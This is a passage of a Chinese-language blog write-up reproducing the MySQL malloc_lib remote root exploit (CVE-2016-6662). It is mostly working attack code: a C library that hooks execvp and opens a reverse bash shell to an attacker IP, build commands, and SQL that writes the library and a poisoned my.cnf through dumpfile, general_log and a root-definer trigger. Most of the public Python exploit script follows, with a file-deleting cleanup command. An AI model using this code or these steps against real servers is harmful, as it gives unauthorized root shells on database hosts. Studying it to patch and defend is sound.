class="token keyword">void</span> <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token keyword">int</span> sockfd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">//socklen_t socklen;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> srv_addr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    srv_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>    srv_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> SHELL_PORT <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 连接回端口</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    srv_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>ATTACKERS_IP<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 连接回 IP</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token comment">// 创建新的 TCP 套接字 & amp;&amp; 连接</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span> AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> IPPROTO_IP <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>srv_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>srv_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">dup2</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token function">execle</span><span class="token punctuation">(</span> <span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> env_list <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// 清理 MySQL 配置文件，以确保在 MySQL 服务启动之前没有恶意注入的内容。它通过截断配置文件来实现。</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">int</span> <span class="token function">config_cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    FILE <span class="token operator">*</span>conf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">2000</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">long</span> cut_offset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    conf <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>INJECTED_CONF<span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>conf<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>       <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> conf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token string">"/usr/sbin/mysqld, Version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>	  cut_offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ftell</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>       <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cut_offset<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">ftruncate</span><span class="token punctuation">(</span><span class="token function">fileno</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">,</span> cut_offset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token function">fclose</span><span class="token punctuation">(</span>conf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">// execvp() hook</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token comment">//execvp 重写，通过 dlsym 函数获取原始 execvp 函数的地址，然后在 execvp 被调用之前，先执行 reverse_shell 函数，然后再调用原始的 execvp 函数。</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token keyword">int</span> <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> filename<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token class-name">pid_t</span>  pid<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token comment">// Simple root PoC (touch /root/root_via_mysql)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/root/root_ via_mysql"</span><span class="token punctuation">,</span> O_CREAT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    old_execvp <span class="token operator">=</span> <span class="token function">dlsym</span><span class="token punctuation">(</span>RTLD_NEXT<span class="token punctuation">,</span> <span class="token string">"execvp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token comment">// 派生一个反向 shell 并执行原始的 execvp（）函数</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="68"></td><td><pre>          <span class="token function">reverse_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    <span class="token comment">// 在启动 mysqld 之前清除注入的有效负载</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token function">config_cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">old_execvp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>使用 gcc 编译该文件</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>gcc <span class="token parameter variable">-Wall</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> mysql_hookandroot_lib.so mysql_hookandroot_lib.c <span class="token parameter variable">-ldl</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129152555242.png" alt="image-20240129152555242"></p><p>然后将这个文件上传到前面搭建 mysql 服务的主机上，修改配置文件在 [mysqld] 下加上一行配置：</p><figure class="highlight xml"><figcaption data-lang="XML"></figcaption><table><tr><td data-num="1"></td><td><pre>malloc_lib=/tmp/mysql_hookandroot_lib.so</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129160926761.png" alt="image-20240129160926761"></p><p>这里这个路径就是我们上传我的 so 文件的路径，然后重新启动 mysql 服务</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129161438244.png" alt="image-20240129161438244"></p><p>这里可以看到就已经成功的 getshell 了，攻击流程简单总结一下就是，将 so 文件写入，然后修改配置文件重启服务，说起来利用条件还是比较苛刻的。上面能成功复现是因为我们有目标机的 shell，配置文件我们可以直接去修改。下面我们尝试有 mysql 权限的情况下扩大危害（但是需要重新启动服务 emmm）</p><h4 id="mysql_root权限"><a class="anchor" href="#mysql_root权限">#</a> mysql_root 权限</h4><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129141523302.png" alt="image-20240129141523302"></p><p>首先刷新 root 权限让其能够外网登录</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">grant</span> <span class="token keyword">all</span> <span class="token keyword">privileges</span> <span class="token keyword">on</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">to</span> <span class="token string">'root'</span><span class="token variable">@'%'</span> identified <span class="token keyword">by</span> <span class="token string">'clown'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>flush <span class="token keyword">privileges</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里先查看一下安全性相关的变量</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%secure%"</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129141906931.png" alt="image-20240129141906931"></p><p>这里可以看到 mysql5.7.10 默认是开放 secure_file_priv 的，接下来需要利用 dumpfile 来将我们生成的 so 文件上传到目标上</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>file1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"mysql_hookandroot_lib.so"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>hexstr <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>file1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>hexstr<span class="token punctuation">)</span></pre></td></tr></table></figure><p>这里简单的脚本将这个文件转为 16 进制</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129165948256.png" alt="image-20240129165948256"></p><p>拿到这样一串 16 进制的数据</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token number">0</span>x（上面的字符串） <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">"/tmp/mysql_hookandroot_lib.so"</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129170357346.png" alt="image-20240129170357346"></p><p>这样就已经完成了第一步，将我们的 so 文件传入，然后就是整个漏洞能够利用最重要的一个点，就是我们需要修改或者增加配置文件</p><p>值得注意的是配置文件的默认路径根据版本和操作系统略有不同</p><p>这里我们可以先尝试新增一个配置文件</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token string">"[mysqld]\nmalloc_lib=/tmp/mysql_hookandroot_lib.so"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/usr/local/mysql/my.cnf"</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>但是在 mysql 中有个安全策略：如果配置文件其他用户对其具有可写的权限，则将会忽略这个配置文件，我们查看刚刚的 so 文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129171501163.png" alt="image-20240129171501163"></p><p>可以看到，这个文件对所有用户都是可写的，所以很显然，这里就不能通过这个 outfile 或者这个 dumpfile 来新添加配置文件，但是在 mysql 中想要写入文件还有一个语句就是：general_log（而且这个语句的写入是追加模式）</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">'/etc/my.cnf'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> general_log <span class="token operator">=</span> <span class="token keyword">ON</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129172617699.png" alt="image-20240129172617699"></p><p>这里香江日志的路径设置为我们的配置文件，然后将日志功能打开</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token string">"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>[mysqld]</pre></td></tr><tr><td data-num="3"></td><td><pre>malloc_lib=/tmp/mysql_hookandroot_lib.so</pre></td></tr><tr><td data-num="4"></td><td><pre>#"<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129172828700.png" alt="image-20240129172828700"></p><p>然后将日志关闭，然后再重新启动</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129173252225.png" alt="image-20240129173252225"></p><p>这里可以看到就已经成功反弹 shell 了</p><div class="note info"><p>这里的利用条件也是比较苛刻，对文件的权限就比较看运气了</p><h4 id="mysql_普通权限"><a class="anchor" href="#mysql_普通权限">#</a> mysql_普通权限</h4><p>上面是 root 权限，所以我们可以对 general_log 配置做一些修改</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240129173559159.png" alt="image-20240129173559159"></p><p>但是实际上非 root 用户也是可以成功利用的，只需要一个具有 select,insert,create,file 权限的用户即可</p><p>我们可以利用 MySQL 触发器的方法来成功写入修改配置文件：</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">delimiter</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">use</span> youdatabase</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">CREATE</span> <span class="token keyword">DEFINER</span><span class="token operator">=</span><span class="token identifier"><span class="token punctuation">`</span>root<span class="token punctuation">`</span></span><span class="token variable">@`localhost`</span> <span class="token keyword">TRIGGER</span> appendToConf</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">AFTER</span> <span class="token keyword">INSERT</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   <span class="token keyword">ON</span> <span class="token identifier"><span class="token punctuation">`</span>active_table<span class="token punctuation">`</span></span> <span class="token keyword">FOR EACH ROW</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">BEGIN</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token keyword">DECLARE</span> void <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">550</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>   <span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'/etc/my.cnf'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>   <span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token keyword">on</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>   <span class="token keyword">select</span> <span class="token string">"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>[mysqld]</pre></td></tr><tr><td data-num="12"></td><td><pre>malloc_lib='/tmp/mysql_hookandroot_lib.so'</pre></td></tr><tr><td data-num="13"></td><td><pre>" <span class="token keyword">INTO</span> void<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>   <span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token keyword">off</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">END</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span></pre></td></tr></table></figure><p>mysql 的触发器可以通过设置 DEFINER 参数，以别的用户身份执行触发器的 SQL 语句。当表刷新的时候就会执行触发器，比如通过 insert 来让表刷新：</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>active_table<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'xyz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>触发器的代码会以 mysql root 权限执行，从而让攻击者修改 general_log 设置，即使此时攻击者没有数据库的管理员权限。</p><div class="note info"><p>想要以 root 身份执行触发器，创建者必须具有 <strong>super</strong> 权限：</p><p>给出一个利用脚本：<span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vZXhwbG9pdHMvMGxkU1FMX015U1FMX1JDRV9leHBsb2l0LnB5">http://legalhackers.com/exploits/0ldSQL_MySQL_RCE_exploit.py</span></p><p>主要代码部分如下：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>intro <span class="token operator">=</span> <span class="token triple-quoted-string string">"""</span></pre></td></tr><tr><td data-num="2"></td><td><pre>0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)</pre></td></tr><tr><td data-num="3"></td><td><pre>(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>For testing purposes only. Do no harm.</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>Discovered/Coded by:</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>Dawid Golunski</pre></td></tr><tr><td data-num="10"></td><td><pre>http://legalhackers.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>"""</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">import</span> argparse</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector    </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">import</span> subprocess</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"[+] "</span> <span class="token operator">+</span> <span class="token builtin">str</span> <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">def</span> <span class="token function">errmsg</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"[!] "</span> <span class="token operator">+</span> <span class="token builtin">str</span> <span class="token operator">+</span> <span class="token string">"\n"</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">shutdown</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>code<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        info<span class="token punctuation">(</span><span class="token string">"Exiting (code: %d)\n"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        errmsg<span class="token punctuation">(</span><span class="token string">"Exiting (code: %d)\n"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    exit<span class="token punctuation">(</span>code<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>cmd <span class="token operator">=</span> <span class="token string">"rm -f /var/lib/mysql/pocdb/poctable.TRG ; rm -f /var/lib/mysql/mysql_hookandroot_lib.so"</span></pre></td></tr><tr><td data-num="35"></td><td><pre>process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">(</span>result<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>rc <span class="token operator">=</span> process<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment"># where will the library to be preloaded reside? /tmp might get emptied on reboot</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment"># /var/lib/mysql is safer option (and mysql can definitely write in there ;)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>malloc_lib_path<span class="token operator">=</span><span class="token string">'/var/lib/mysql/mysql_hookandroot_lib.so'</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment"># Main Meat</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">print</span> intro</pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token comment"># Parse input args</span></pre></td></tr><tr><td data-num="50"></td><td><pre>parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>prog<span class="token operator">=</span><span class="token string">'0ldSQL_MySQL_RCE_exploit.py'</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">'PoC for MySQL Remote Root Code Execution / Privesc CVE-2016-6662'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-dbuser'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TARGET_USER'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'MySQL username'</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="52"></td><td><pre>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-dbpass'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TARGET_PASS'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'MySQL password'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-dbname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TARGET_DB'</span><span class="token punctuation">,</span>   required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Remote MySQL database name'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-dbhost'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TARGET_HOST'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Remote MySQL host'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-mycnf'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TARGET_MYCNF'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Remote my.cnf owned by mysql user'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                  </pre></td></tr><tr><td data-num="57"></td><td><pre>args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment"># Connect to database. Provide a user with CREATE TABLE, SELECT and FILE permissions</span></pre></td></tr><tr><td 